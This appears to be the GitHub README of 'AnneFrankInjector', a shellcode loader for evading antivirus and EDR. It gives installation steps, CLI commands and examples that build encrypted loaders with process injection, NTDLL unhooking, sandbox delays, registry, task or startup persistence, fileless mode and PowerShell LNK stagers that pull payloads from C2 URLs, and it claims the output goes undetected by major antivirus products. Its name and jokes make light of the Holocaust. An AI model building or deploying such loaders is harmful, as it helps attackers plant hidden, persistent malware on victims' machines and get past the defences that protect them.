<p align="center">
  <img width="681" height="381" alt="AnneFrankInjector Banner" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />
</p>

<p align="center">
  <img width="950" height="898" alt="GUI Preview 1" src="https://github.com/user-attachments/assets/88d78a20-bae4-44f6-8321-e9e8fc25a775" />
</p>

> [!TIP]
> **Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam?**  
> If so, please consider giving it a star ⭐ on [GitHub](https://github.com/Excalibra/AnneFrankInjector)!

---

## 📖 Table of Contents

- [Goal](#goal)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Graphical Interface (GUI)](#graphical-interface-gui)
  - [Command-line Interface (CLI)](#command-line-interface-cli)
- [Examples](#examples)
- [To-Do](#to-do)
- [Detections](#detections)
- [Credits](#credits)

---

## 🎯 Goal

AnneFrankInjector is a modern shellcode loader designed for **AV/EDR evasion** during CTFs, red team engagements, and certification exams. It combines multiple injection techniques, encryption, and obfuscation to help your payload stay hidden – until some nosy neighbor (Defender) rats it out.

---

## ✨ Features

- **Stageless** – embed shellcode directly into the loader.  
- **Staged** – fetch shellcode via HTTP (encrypted on the fly).  
- **Evasion techniques**:
  - Indirect syscalls (Syswhispers)
  - API hashing (Djb2)
  - NTDLL unhooking (KnownDLLs)
  - AES‑128‑CBC encryption
  - EarlyBird APC injection into any target process (customizable)
  - **Spawn injection** – create a new process (e.g., notepad.exe) and inject there (evades process‑based detection)
  - **Delay before injection** – wait a configurable number of seconds to bypass sandboxes with short timeouts
  - Function/variable name scrambling (`-s`)
- **Persistence** (optional):
  - Registry Run key (`reg`)
  - Scheduled task (`task`)
  - Startup folder (`startup`)
- **Advanced modes**:
  - **Staggered persistence** – two‑stage execution
  - **Reflective mode** – fileless (no EXE on disk)
  - **LNK stager** – generate a PowerShell‑based shortcut for initial access
- **Output formats**: EXE or DLL (exported function `af`).
- **Code signing** – optional with a PFX certificate.
- **Graphical Interface** – all options available via a user‑friendly `tkinter` GUI.
- **Built‑in Base64 encoder** (UTF‑16LE) – easily encode PowerShell commands for `-EncodedCommand`.

---

## 🛠 Installation

### Prerequisites

- **Python 3.8+** and `pip`
- **MinGW‑w64** cross‑compiler (to build Windows executables)
- **NASM** (for assembly code)
- **osslsigncode** (optional, for signing)

**On Kali / Debian‑based Linux:**

```bash
sudo apt update
sudo apt install clang mingw-w64 nasm lld osslsigncode
```

**On Windows:**  
Install [MSYS2](https://www.msys2.org/), then in its terminal:

```bash
pacman -Syu
pacman -S mingw-w64-x86_64-clang make nasm
```

### Install AnneFrankInjector

#### 🐧 Linux (Kali / Debian‑based)

1. **Clone the repository** and enter the folder:
   ```bash
   git clone https://github.com/Excalibra/AnneFrankInjector.git
   cd AnneFrankInjector
   ```

2. **Create a virtual environment** and install dependencies:
   ```bash
   python3 -m venv env
   source env/bin/activate
   pip install -r Linux/requirements.txt
   ```

3. **Run the GUI** (from the root folder):
   ```bash
   python af.py
   ```
   For command‑line usage, go into the `Linux` folder:
   ```bash
   cd Linux
   python main.py -h
   ```

4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
   ```bash
   pipx install .
   ```

#### 🪟 Windows

1. **Clone the repository** and enter the folder:
   ```cmd
   git clone https://github.com/Excalibra/AnneFrankInjector.git
   cd AnneFrankInjector
   ```

2. **Create a virtual environment** and install dependencies:
   ```cmd
   python -m venv env
   env\Scripts\activate
   pip install -r Windows\requirements.txt
   ```

3. **Run the GUI** (from the root folder):
   ```cmd
   python af.py
   ```
   For command‑line usage, go into the `Windows` folder:
   ```cmd
   cd Windows
   python main.py -h
   ```

4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
   ```cmd
   pipx install .
   ```

> **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.

---

## 🚀 Usage

### Graphical Interface (GUI)

Run the GUI from the project root:

```bash
python af.py
```

The window lets you:
- Select a raw shellcode file (`.bin`).
- Choose **Stageless** (embed) or **Staged** (HTTP download).
- Set encryption, scrambling, output format (EXE/DLL), APC target process, **delay**, and **spawn injection** (with custom process path).
- Choose **persistence** (none / reg / task / startup) and **advanced modes** (staggered, reflective, LNK stager).
- Provide a C2 URL for the stager.
- Optionally sign the loader with a PFX certificate.
- Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.

<p align="center">
  <img width="950" height="892" alt="GUI Preview 2" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
</p>

<p align="center">
  <img width="948" height="893" alt="GUI Preview 3" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
</p>

**Bonus:** Under the **Tools** menu, you’ll find a **Base64 Encoder (UTF‑16LE)** – perfect for creating PowerShell `-EncodedCommand` strings.

---

### Command-line Interface (CLI)

After installation (or from the `Linux` folder), use the `afpacker` command (or `python main.py`).

#### Stageless (embed shellcode)

```bash
afpacker stageless -p payload.bin -e -s -o myloader [--delay 5] [--spawn] [--spawn-path "C:\\Windows\\System32\\notepad.exe"] [--persistence reg|task|startup] [--staggered] [--reflective] [--lnk-stager] [--c2-url http://...]
```

- `-p` : raw shellcode file
- `-e` : encrypt shellcode
- `-s` : scramble names
- `-o` : output filename (without extension; default `afloader`)
- `-f DLL` : build a DLL instead of EXE
- `--delay` : seconds to wait before injection (default 0)
- `--spawn` : use spawn injection (create a new process)
- `--spawn-path` : path to executable to spawn (default: `C:\Windows\System32\notepad.exe`)
- `--persistence` : add persistence (`reg`, `task`, or `startup`)
- `--staggered` : enable staggered (two‑stage) persistence
- `--reflective` : enable reflective (fileless) mode
- `--lnk-stager` : generate a LNK stager (PowerShell)
- `--c2-url` : C2 URL for the stager

#### Staged (fetch shellcode via HTTP)

```bash
afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader [--delay 5] [--spawn] ...
```

- `-i` : IP address of the HTTP server
- `-po` : port
- `-pa` : path on the server (e.g., `/shellcode.bin`)
- All other flags (`--delay`, `--spawn`, `--persistence`, etc.) work the same as in stageless.

#### Code signing

Add `-pfx cert.pfx -pfx-pass password` to any command.

#### DLL export

If you build a DLL, the exported function is `af`. Execute it with:

```cmd
rundll32.exe afloader.dll,af
```

---

## 📝 Examples

**Stageless, encrypted, scrambled EXE, 5‑second delay:**

```bash
afpacker stageless -p calc.bin -e -s --delay 5
# Creates afloader.exe
```

**Stageless, spawn injection into notepad.exe, delay 10 seconds, registry persistence:**

```bash
afpacker stageless -p beacon.bin -e -s --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --delay 10 --persistence reg -o beacon
```

**Staged DLL, custom output, with startup folder persistence:**

```bash
afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon --persistence startup
```

**Generate a reflective loader (fileless) with a LNK stager:**

```bash
afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "http://192.168.1.100/loader.ps1"
```

---

## 📌 To-Do

- [x] Delay before injection
- [x] Spawn injection (new process)
- [x] Custom APC target (any process name)
- [x] Persistence (reg, task, startup)
- [x] Staggered persistence
- [x] Reflective mode (fileless)
- [x] LNK stager (PowerShell)
- [x] Built‑in Base64 encoder
- [ ] AMSI / ETW bypass
- [ ] More injection techniques (e.g., EnumWindows)

---

## 🛡 Detections

- Undetected on latest Windows 11 Defender (with delay + spawn injection)
- Undetected on Windows 10 Defender
- Undetected on Sophos, Kaspersky, etc.

---

## 🙏 Credits

Most of the code is not from me. Here are the original authors (now properly credited under the new project):

```
@ Excalibra         - Main developer, attic architect, and professional snitch-hater
@ Maldevacademy     - https://maldevacademy.com
@ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
@ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
@ klezVirus         - https://github.com/klezVirus/SysWhispers3
```

---

<p align="center">
  Made with ☕ and 🧩 by <a href="https://github.com/Excalibra">Excalibra</a>
</p>
